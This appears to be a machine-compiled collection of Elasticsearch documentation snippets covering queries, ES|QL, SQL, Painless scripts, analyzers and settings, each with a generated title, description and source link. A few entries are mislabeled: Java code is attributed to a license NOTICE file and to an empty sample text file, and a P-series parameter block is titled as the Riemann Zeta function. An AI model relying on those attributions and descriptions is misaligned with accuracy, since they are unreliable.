Words\nDESCRIPTION: Defines Hindi stop words for use in Elasticsearch, with links to the predefined stop words in Lucene.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-stop-tokenfilter.md#2025-04-21_snippet_22\n\nLANGUAGE: markdown\nCODE:\n```\n`_hindi_`\n:   [Hindi stop words](https://github.com/apache/lucene/blob/main/lucene/analysis/common/src/resources/org/apache/lucene/analysis/hi/stopwords.txt)\n```\n\n----------------------------------------\n\nTITLE: Configuring Secure Password for Remote Cluster Server SSL Truststore in Elasticsearch\nDESCRIPTION: Secure setting for specifying the password for the truststore used in remote cluster server SSL configuration.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/security-settings.md#2025-04-21_snippet_36\n\nLANGUAGE: properties\nCODE:\n```\nxpack.security.remote_cluster_server.ssl.truststore.secure_password\n```\n\n----------------------------------------\n\nTITLE: minimum_should_match with Explicit Operators and Multiple Fields\nDESCRIPTION: Shows how explicit operators affect minimum_should_match behavior with multiple fields. Each term is considered a separate clause, creating a more complex boolean query where minimum_should_match is applied.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-query-string-query.md#2025-04-21_snippet_21\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"query_string\": {\n      \"fields\": [\n        \"title\",\n        \"content\"\n      ],\n      \"query\": \"this OR that OR thus\",\n      \"minimum_should_match\": 2\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: TO_CARTESIANSHAPE Image Reference\nDESCRIPTION: Markdown directive for including a function diagram showing the syntax of TO_CARTESIANSHAPE function.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/to_cartesianshape.md#2025-04-21_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\n:::{image} ../../../images/functions/to_cartesianshape.svg\n:alt: Embedded\n:class: text-center\n:::\n```\n\n----------------------------------------\n\nTITLE: Configuring an Ingest Pipeline with Script Processor in Elasticsearch\nDESCRIPTION: Creates an ingest pipeline named 'seats' with a script processor that parses date and time fields and converts them into a datetime field in ISO format.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-context-examples.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT /_ingest/pipeline/seats\n{\n  \"description\": \"update datetime for seats\",\n  \"processors\": [\n    {\n      \"script\": {\n        \"source\": \"String[] dateSplit = ctx.date.splitOnToken('-'); String year = dateSplit[0].trim(); String month = dateSplit[1].trim(); if (month.length() == 1) { month = '0' + month; } String day = dateSplit[2].trim(); if (day.length() == 1) { day = '0' + day; } boolean pm = ctx.time.substring(ctx.time.length() - 2).equals('PM'); String[] timeSplit = ctx.time.substring(0, ctx.time.length() - 2).splitOnToken(':'); int hours = Integer.parseInt(timeSplit[0].trim()); int minutes = Integer.parseInt(timeSplit[1].trim()); if (pm) { hours += 12; } String dts = year + '-' + month + '-' + day + 'T' + (hours < 10 ? '0' + hours : '' + hours) + ':' + (minutes < 10 ? '0' + minutes : '' + minutes) + ':00+08:00'; ZonedDateTime dt = ZonedDateTime.parse(dts, DateTimeFormatter.ISO_OFFSET_DATE_TIME); ctx.datetime = dt.getLong(ChronoField.INSTANT_SECONDS)*1000L;\"\n      }\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: MongoDB Find Query with Projection\nDESCRIPTION: Example of a find query with complex filter conditions and field projection\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-mongodb.md#2025-04-21_snippet_8\n\nLANGUAGE: javascript\nCODE:\n```\n{\n  \"find\": {\n    \"filter\": {\n      \"languages\": [\n        \"English\"\n      ],\n      \"runtime\": {\n        \"$gt\":90\n      }\n    },\n    \"projection\":{\n      \"tomatoes\": 1\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Estonian Custom Analyzer in Elasticsearch\nDESCRIPTION: This code snippet demonstrates the process of creating a custom analyzer for the Estonian language using Elasticsearch. It showcases filter settings for stop words, keyword markers, and stemming functionalities to enhance text indexing.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-lang-analyzer.md#2025-04-21_snippet_12\n\nLANGUAGE: json\nCODE:\n```\nPUT /estonian_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"filter\": {\n        \"estonian_stop\": {\n          \"type\":       \"stop\",\n          \"stopwords\":  \"_estonian_\" <1>\n        },\n        \"estonian_keywords\": {\n          \"type\":       \"keyword_marker\",\n          \"keywords\":   [\"näide\"] <2>\n        },\n        \"estonian_stemmer\": {\n          \"type\":       \"stemmer\",\n          \"language\":   \"estonian\"\n        }\n      },\n      \"analyzer\": {\n        \"rebuilt_estonian\": {\n          \"tokenizer\":  \"standard\",\n          \"filter\": [\n            \"lowercase\",\n            \"estonian_stop\",\n            \"estonian_keywords\",\n            \"estonian_stemmer\"\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Handling Missing Events in EQL Sequences\nDESCRIPTION: Demonstrates how to use '!' to match missing events in timespan-constrained sequences in EQL.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-syntax.md#2025-04-21_snippet_13\n\nLANGUAGE: eql\nCODE:\n```\nsequence by host.name, user.name with maxspan=5s\n  [ authentication where event.code : \"4624\" ]\n  ![ authentication where event.code : \"4647\" ]\n```\n\n----------------------------------------\n\nTITLE: Using LOG10 Function in Elasticsearch SQL\nDESCRIPTION: Returns the base-10 logarithm of the input numeric expression. The function takes a numeric input and returns a double value. If null is provided, it returns null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-math.md#2025-04-21_snippet_16\n\nLANGUAGE: sql\nCODE:\n```\nLOG10(numeric_exp) <1>\n```\n\n----------------------------------------\n\nTITLE: Analyzing File Paths with Forward and Reversed Path Hierarchy Tokenizers\nDESCRIPTION: This example demonstrates the tokens generated for the same file path by both the forward and reversed path hierarchy tokenizers, showing how they differ in their tokenization approach.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-pathhierarchy-tokenizer.md#2025-04-21_snippet_6\n\nLANGUAGE: console\nCODE:\n```\nPOST file-path-test/_analyze\n{\n  \"analyzer\": \"custom_path_tree\",\n  \"text\": \"/User/alice/photos/2017/05/16/my_photo1.jpg\"\n}\n\nPOST file-path-test/_analyze\n{\n  \"analyzer\": \"custom_path_tree_reversed\",\n  \"text\": \"/User/alice/photos/2017/05/16/my_photo1.jpg\"\n}\n```\n\n----------------------------------------\n\nTITLE: Converting Array of Integers to Strings using TO_STRING in ESQL\nDESCRIPTION: Shows how TO_STRING function handles array inputs by converting each integer element to its string representation. Demonstrates conversion of array [10, 9, 8] to array of strings [\"10\", \"9\", \"8\"].\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/to_string.md#2025-04-21_snippet_1\n\nLANGUAGE: esql\nCODE:\n```\nROW a=[10, 9, 8]\n| EVAL j = TO_STRING(a)\n```\n\n----------------------------------------\n\nTITLE: Dot Operator Examples in Regular Expressions\nDESCRIPTION: Examples showing the dot operator which matches any character in Elasticsearch regular expressions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/regexp-syntax.md#2025-04-21_snippet_3\n\nLANGUAGE: text\nCODE:\n```\nab.     # matches 'aba', 'abb', 'abz', etc.\n```\n\n----------------------------------------\n\nTITLE: String Concatenation with Def in Painless\nDESCRIPTION: Demonstrates string concatenation involving def types in Painless. Shows type switching where a variable can store multiple distinct data types through implicit type casting and concatenation. Requires initial variable definition.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-reference.md#2025-04-21_snippet_19\n\nLANGUAGE: painless\nCODE:\n```\ndef d = 2;\nd = \"con\" + d + \"cat\";\n```\n\n----------------------------------------\n\nTITLE: SQL Example of SUM_OF_SQUARES with Calculated Field\nDESCRIPTION: This SQL snippet illustrates using SUM_OF_SQUARES with a calculated field (salary / 24.0). It calculates the minimum, maximum, and sum of squares of half-monthly salaries from the 'emp' table. The result provides these calculated values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-aggs.md#2025-04-21_snippet_20\n\nLANGUAGE: sql\nCODE:\n```\n```sql\nSELECT MIN(salary / 24.0) AS min, MAX(salary / 24.0) AS max, SUM_OF_SQUARES(salary / 24.0) AS sumsq FROM emp;\n\n       min        |       max        |       sumsq\n------------------+------------------+-------------------\n1055.1666666666667|3124.9583333333335|4.370488293767361E8\n```\n```\n\n----------------------------------------\n\nTITLE: Installing Mapper Size Plugin in Elasticsearch\nDESCRIPTION: Command to install the mapper-size plugin using Elasticsearch's plugin manager. The plugin must be installed on every node in the cluster, and nodes must be restarted after installation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/mapper-size.md#2025-04-21_snippet_0\n\nLANGUAGE: sh\nCODE:\n```\nsudo bin/elasticsearch-plugin install mapper-size\n```\n\n----------------------------------------\n\nTITLE: SQL Example of VAR_POP with Calculated Field\nDESCRIPTION: This example demonstrates VAR_POP with a calculated field (salary / 24.0). It computes the minimum, maximum, and population variance of half-monthly salaries from the 'emp' table. The result presents these calculated values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-aggs.md#2025-04-21_snippet_23\n\nLANGUAGE: sql\nCODE:\n```\n```sql\nSELECT MIN(salary / 24.0) AS min, MAX(salary / 24.0) AS max, VAR_POP(salary / 24.0) AS varpop FROM emp;\n\n       min        |       max        |      varpop\n------------------+------------------+------------------\n1055.1666666666667|3124.9583333333335|328956.04185329855\n```\n```\n\n----------------------------------------\n\nTITLE: Selecting from a Table with Special Characters\nDESCRIPTION: Example showing how to use double quotes to escape special SQL characters in table names like dots, hyphens, or asterisks.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-syntax-select.md#2025-04-21_snippet_6\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM \"emp\" LIMIT 1;\n```\n\n----------------------------------------\n\nTITLE: Using Static Members in Painless\nDESCRIPTION: Shows how to access static member fields and call static methods on reference types without instance allocation. Demonstrates usage of Integer.MAX_VALUE and Long.parseLong.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-types.md#2025-04-22_snippet_4\n\nLANGUAGE: painless\nCODE:\n```\nint i = Integer.MAX_VALUE;       <1>\nlong l = Long.parseLong(\"123L\"); <2>\n```\n\n----------------------------------------\n\nTITLE: Custom Script Moving Function Example\nDESCRIPTION: Example showing how to use a custom script in a moving function aggregation to return the first value from the window.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-movfn-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPOST /_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"my_date_histo\": {\n      \"date_histogram\": {\n        \"field\": \"date\",\n        \"calendar_interval\": \"1M\"\n      },\n      \"aggs\": {\n        \"the_sum\": {\n          \"sum\": { \"field\": \"price\" }\n        },\n        \"the_movavg\": {\n          \"moving_fn\": {\n            \"buckets_path\": \"the_sum\",\n            \"window\": 10,\n            \"script\": \"return values.length > 0 ? values[0] : Double.NaN\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Executing Span First Query in Elasticsearch Console\nDESCRIPTION: This code snippet demonstrates how to execute a span first query using the Elasticsearch console. The snippet assumes Elasticsearch setup and involves using a 'span_first' query to match a term near the beginning of a specified field. The 'end' parameter specifies the maximum position a span can reach to be considered a match.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-span-first-query.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"span_first\": {\n      \"match\": {\n        \"span_term\": { \"user.id\": \"kimchy\" }\n      },\n      \"end\": 3\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Array Simplification Example with Synthetic _source\nDESCRIPTION: Shows how arrays with different field names are simplified when using synthetic _source.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/mapping-source-field.md#2025-04-21_snippet_2\n\nLANGUAGE: json\nCODE:\n```\nPUT idx/_doc/1\n{\n  \"foo\": [\n    {\n      \"bar\": 1\n    },\n    {\n      \"baz\": 2\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring GCE Network Host Settings in Elasticsearch\nDESCRIPTION: Examples of different network host configurations when using the discovery-gce plugin. Shows how to specify private IP addresses from different network interfaces and hostname settings.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-gce-network-host.md#2025-04-21_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\n# get the IP address from network interface 1\nnetwork.host: _gce:privateIp:1_\n# Using GCE internal hostname\nnetwork.host: _gce:hostname_\n# shortcut for _gce:privateIp:0_ (recommended)\nnetwork.host: _gce_\n```\n\n----------------------------------------\n\nTITLE: Implementing Error Message Utility Class in Java\nDESCRIPTION: A utility class that provides static methods for generating standard error messages for test assertions. It includes methods for comparing values, joining values into messages, and handling multiple values in error reporting.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-gcs/licenses/checker-qual-NOTICE.txt#2025-04-21_snippet_0\n\nLANGUAGE: java\nCODE:\n```\n/*\n * Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one\n * or more contributor license agreements. Licensed under the Elastic License\n * 2.0 and the Server Side Public License, v 1; you may not use this file except\n * in compliance with, at your election, the Elastic License 2.0 or the Server\n * Side Public License, v 1.\n */\n\nimport java.util.Collection;\n\npublic class Error {\n    /*\n     * Return standard error message for user-supplied message.\n     */\n    public static String message(String userMessage) {\n        return userMessage != null ? userMessage : \"\";\n    }\n\n    /*\n     * Return standard error message for value comparison.\n     */\n    public static String message(String userMessage, Object expected, Object actual) {\n        return message(userMessage) + \"expected: \" + expected + \" but was: \" + actual;\n    }\n\n    /*\n     * Join provided values into message.\n     */\n    public static String message(Collection<?> values) {\n        StringBuilder message = new StringBuilder();\n        for (Object value : values) {\n            message.append(message.length() > 0 ? \", \" : \"\").append(value);\n        }\n        return message.toString();\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Querying Database Name with DATABASE() Function in Elasticsearch SQL\nDESCRIPTION: The DATABASE() function returns the name of the Elasticsearch cluster being queried. This function takes no input parameters and always returns a non-null string value representing the cluster name.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-system.md#2025-04-21_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nDATABASE()\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT DATABASE();\n\n   DATABASE\n---------------\nelasticsearch\n```\n\n----------------------------------------\n\nTITLE: Defining Array and Data Structure Classes in Java\nDESCRIPTION: This snippet presents several classes related to arrays and collections, such as ArrayDeque, ArrayList, and Arrays. It includes constructors and utility methods for managing collections of data.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.util.txt#2025-04-21_snippet_6\n\nLANGUAGE: Java\nCODE:\n```\nclass java.util.ArrayDeque {\n  ()\n  (Collection)\n  ArrayDeque clone()\n}\n\nclass java.util.ArrayList {\n  ()\n  (Collection)\n  def clone()\n  void trimToSize()\n}\n\nclass java.util.Arrays {\n  List asList(Object[])\n  boolean deepEquals(Object[],Object[])\n  int deepHashCode(Object[])\n  String deepToString(Object[])\n}\n```\n\n----------------------------------------\n\nTITLE: Minimum Should Match Script Implementation in Painless\nDESCRIPTION: A Painless script that determines the minimum number of terms required to match based on the provided parameters. Uses Math.min to ensure the minimum actors requirement doesn't exceed the total number of terms.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-min-should-match-context.md#2025-04-21_snippet_0\n\nLANGUAGE: painless\nCODE:\n```\nMath.min(params['num_terms'], params['min_actors_to_see'])\n```\n\n----------------------------------------\n\nTITLE: Range Aggregation with Runtime Field in Elasticsearch\nDESCRIPTION: Demonstrates using a runtime field for currency conversion in a range aggregation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-range-aggregation.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nGET sales/_search\n{\n  \"runtime_mappings\": {\n    \"price.euros\": {\n      \"type\": \"double\",\n      \"script\": {\n        \"source\": \"\"\"\n          emit(doc['price'].value * params.conversion_rate)\n        \"\"\",\n        \"params\": {\n          \"conversion_rate\": 0.835526591\n        }\n      }\n    }\n  },\n  \"aggs\": {\n    \"price_ranges\": {\n      \"range\": {\n        \"field\": \"price.euros\",\n        \"ranges\": [\n          { \"to\": 100 },\n          { \"from\": 100, \"to\": 200 },\n          { \"from\": 200 }\n        ]\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Custom Keys in Range Aggregation for Elasticsearch\nDESCRIPTION: Illustrates how to customize keys for each range in a range aggregation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-range-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET sales/_search\n{\n  \"aggs\": {\n    \"price_ranges\": {\n      \"range\": {\n        \"field\": \"price\",\n        \"keyed\": true,\n        \"ranges\": [\n          { \"key\": \"cheap\", \"to\": 100 },\n          { \"key\": \"average\", \"from\": 100, \"to\": 200 },\n          { \"key\": \"expensive\", \"from\": 200 }\n        ]\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Removing Trailing Whitespace in ESQL\nDESCRIPTION: This code snippet describes the functionality of an ESQL function that removes trailing whitespaces from a string. It is part of an automatically generated test case for Elasticsearch SQL.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/rtrim.md#2025-04-21_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n**Description**\n\nRemoves trailing whitespaces from a string.\n```\n\n----------------------------------------\n\nTITLE: Downloading GraphQL Connector Configuration File with cURL\nDESCRIPTION: This command downloads the sample configuration file for the GraphQL connector using cURL, saving it to the user's home directory in a 'connectors-config' folder.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-graphql.md#2025-04-21_snippet_0\n\nLANGUAGE: sh\nCODE:\n```\ncurl https://raw.githubusercontent.com/elastic/connectors/main/config.yml.example --output ~/connectors-config/config.yml\n```\n\n----------------------------------------\n\nTITLE: Embedding SHA1 Function Syntax Diagram in Markdown\nDESCRIPTION: This snippet shows how to embed an image of the SHA1 function syntax diagram in the documentation using Markdown.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/sha1.md#2025-04-21_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\n:::{image} ../../../images/functions/sha1.svg\n:alt: Embedded\n:class: text-center\n:::\n```\n\n----------------------------------------\n\nTITLE: Creating an Azure VM for Elasticsearch\nDESCRIPTION: Command to create an Azure virtual machine for running Elasticsearch. This specifies VM size, location, SSH settings, and authentication method using the previously created certificate.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-azure-classic-long.md#2025-04-21_snippet_6\n\nLANGUAGE: sh\nCODE:\n```\nazure vm create azure-elasticsearch-cluster \\\n                b39f27a8b8c64d52b05eac6a62ebad85__Ubuntu-13_10-amd64-server-20130808-alpha3-en-us-30GB \\\n                --vm-name myesnode1 \\\n                --location \"West Europe\" \\\n                --vm-size extrasmall \\\n                --ssh 22 \\\n                --ssh-cert /tmp/azure-certificate.pem \\\n                elasticsearch password1234\\!\\!\n```\n\n----------------------------------------\n\nTITLE: Computing Median for Even Number of Values in ESQL\nDESCRIPTION: Example demonstrating how MV_MEDIAN handles an array with even number of elements. For integer values, it takes the average of the middle two values and rounds down.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/mv_median.md#2025-04-21_snippet_1\n\nLANGUAGE: esql\nCODE:\n```\nROW a=[3, 7, 1, 6]\n| EVAL median_a = MV_MEDIAN(a)\n```\n\n----------------------------------------\n\nTITLE: Pattern Analyzer in Elasticsearch\nDESCRIPTION: Analyzer that uses a regular expression to split text into terms, with support for lowercasing and stop word removal.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analyzer-reference.md#2025-04-21_snippet_5\n\nLANGUAGE: elasticsearch\nCODE:\n```\n\"analyzer\": \"pattern\"\n```\n\n----------------------------------------\n\nTITLE: Aggregating on _ignored Field to Find All Ignored Fields in Elasticsearch\nDESCRIPTION: This query uses terms aggregation on the _ignored field to identify all fields that were ignored during indexing. This feature is available since Elasticsearch 8.15.0.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/mapping-ignored-field.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET _search\n{\n  \"aggs\": {\n    \"ignored_fields\": {\n      \"terms\": {\n         \"field\": \"_ignored\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: SQL Example of SUM_OF_SQUARES Function Usage\nDESCRIPTION: This SQL example shows how SUM_OF_SQUARES is used to calculate the sum of squares of salaries from the 'emp' table, along with the minimum and maximum salary values. The result displays the minimum, maximum, and the sum of squares.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-aggs.md#2025-04-21_snippet_19\n\nLANGUAGE: sql\nCODE:\n```\n```sql\nSELECT MIN(salary) AS min, MAX(salary) AS max, SUM_OF_SQUARES(salary) AS sumsq\n       FROM emp;\n\n      min      |      max      |     sumsq\n---------------+---------------+----------------\n25324          |74999          |2.51740125721E11\n```\n```\n\n----------------------------------------\n\nTITLE: Using Pre-Increment Operator with 'def' Type in Painless\nDESCRIPTION: This example demonstrates how the pre-increment operator '++' works with the 'def' type in Painless, including implicit casting and type handling.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-numeric.md#2025-04-21_snippet_5\n\nLANGUAGE: painless\nCODE:\n```\ndef x = 1;\n++x;\n```\n\n----------------------------------------\n\nTITLE: Defining Parameters for Riemann Zeta Function in ESQL\nDESCRIPTION: This snippet outlines the parameters for the Riemann Zeta function in ESQL. It specifies 'number' as a multivalue expression and 'p' as a constant that affects the weighted sum calculation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/mv_pseries_weighted_sum.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n**Parameters**\n\n`number`\n:   Multivalue expression.\n\n`p`\n:   It is a constant number that represents the *p* parameter in the P-Series. It impacts every element's contribution to the weighted sum.\n```\n\n----------------------------------------\n\nTITLE: ST_ENVELOPE Function Documentation Header\nDESCRIPTION: Markdown header and metadata for ST_ENVELOPE function documentation, including a note about auto-generation and link references.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/st_envelope.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n## `ST_ENVELOPE` [esql-st_envelope]\n```\n\n----------------------------------------\n\nTITLE: Privileges Object Schema for Security Config Change Events in Elasticsearch\nDESCRIPTION: Specifies the structure of a privileges object in security configuration change events. It includes fields for the application, privilege name, actions, and metadata.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/elasticsearch-audit-events.md#2025-04-21_snippet_23\n\nLANGUAGE: javascript\nCODE:\n```\n{\"application\": <string>, \"name\": <string>, \"actions\": <string_list>,\n\"metadata\": <object>}\n```\n\n----------------------------------------\n\nTITLE: Decoding Geohash to Bounding Box using Node.js\nDESCRIPTION: This JavaScript snippet demonstrates how to use the node-geohash library to decode a geohash into a bounding box, which can be useful for systems that don't support geohashes directly.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-geohashgrid-aggregation.md#2025-04-21_snippet_4\n\nLANGUAGE: js\nCODE:\n```\nvar geohash = require('ngeohash');\n\n// bbox will contain [ 52.03125, 4.21875, 53.4375, 5.625 ]\n//                   [   minlat,  minlon,  maxlat, maxlon]\nvar bbox = geohash.decode_bbox('u17');\n```\n\n----------------------------------------\n\nTITLE: Removing Trailing Whitespaces with RTRIM in ESQL\nDESCRIPTION: Demonstrates how to use the RTRIM function to remove trailing whitespaces from string columns in an ESQL query. The example shows applying RTRIM to multiple columns and then concatenating the results with single quotes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/rtrim.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW message = \"   some text  \",  color = \" red \"\n| EVAL message = RTRIM(message)\n| EVAL color = RTRIM(color)\n| EVAL message = CONCAT(\"'\", message, \"'\")\n| EVAL color = CONCAT(\"'\", color, \"'\")\n```\n\n----------------------------------------\n\nTITLE: Map object parsing with dot notation support in XContentParser\nDESCRIPTION: Implementation of map object parsing that respects dot notation in field names. When enabled, it creates deep copies of map values to ensure the original data remains unchanged during the transformation process.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/src/test/resources/org/elasticsearch/ingest/attachment/test/sample-files/text-empty.txt#2025-04-21_snippet_4\n\nLANGUAGE: Java\nCODE:\n```\n@Override\npublic Map<String, Object> map() throws IOException {\n    Map<String, Object> map = delegate.map();\n    if (deepCopyMapAndListValues == false) {\n        return map;\n    }\n    @SuppressWarnings(\"unchecked\")\n    Map<String, Object> copy = (Map<String, Object>) copy(map);\n    return copy;\n}\n```\n\n----------------------------------------\n\nTITLE: Uploading Extension with Multipart Form Data\nDESCRIPTION: Alternative method for uploading extension file using multipart/form-data content type for clients without native zip handling.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/cloud/ec-custom-bundles.md#2025-04-21_snippet_6\n\nLANGUAGE: bash\nCODE:\n```\ncurl -XPUT \\\n-H 'Expect:' \\\n-H 'content-type: multipart/form-data' \\\n-H \"Authorization: ApiKey $EC_API_KEY\" \\\n\"https://api.elastic-cloud.com/api/v1/deployments/extensions/$extension_id\" -F \"file=@/tmp/synonyms.zip\"\n```\n\n----------------------------------------\n\nTITLE: Creating Elasticsearch Shape Mapping\nDESCRIPTION: This snippet shows how to create an Elasticsearch index with a mapping that includes a `shape` field. The `shape` type allows storing and querying geographical shapes. This is a prerequisite for using the shape query.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-shape-query.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT /example\n{\n  \"mappings\": {\n    \"properties\": {\n      \"geometry\": {\n        \"type\": \"shape\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Truststore Type for Remote Cluster Server SSL in Elasticsearch\nDESCRIPTION: Setting to specify the format of the truststore as PKCS#12 for remote cluster server SSL.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/security-settings.md#2025-04-21_snippet_38\n\nLANGUAGE: properties\nCODE:\n```\nxpack.security.remote_cluster_server.ssl.truststore.type\n```\n\n----------------------------------------\n\nTITLE: Query String Grouping\nDESCRIPTION: Shows how to use parentheses to group terms, target specific fields, and apply complex query logic\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-query-string-query.md#2025-04-21_snippet_10\n\nLANGUAGE: elasticsearch\nCODE:\n```\n(quick OR brown) AND fox\n```\n\nLANGUAGE: elasticsearch\nCODE:\n```\nstatus:(active OR pending) title:(full text search)^2\n```\n\n----------------------------------------\n\nTITLE: Creating Object Mapping with Long Fields for Calculation\nDESCRIPTION: This snippet creates an index with a measures object containing start and end fields of type long, which will be used to calculate differences in values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-api-examples.md#2025-04-21_snippet_18\n\nLANGUAGE: console\nCODE:\n```\nPUT /my-index-000001/\n{\n  \"mappings\": {\n    \"properties\": {\n      \"measures\": {\n        \"properties\": {\n          \"start\": {\n            \"type\": \"long\"\n          },\n          \"end\": {\n           \"type\": \"long\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Sorting Across Multiple Indices with Numeric Type Casting in Elasticsearch\nDESCRIPTION: Demonstrates how to use the 'numeric_type' option to force a specific type when sorting across indices with different field types.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/sort-search-results.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nPOST /index_long,index_double/_search\n{\n   \"sort\" : [\n      {\n        \"field\" : {\n            \"numeric_type\" : \"double\"\n        }\n      }\n   ]\n}\n```\n\n----------------------------------------\n\nTITLE: 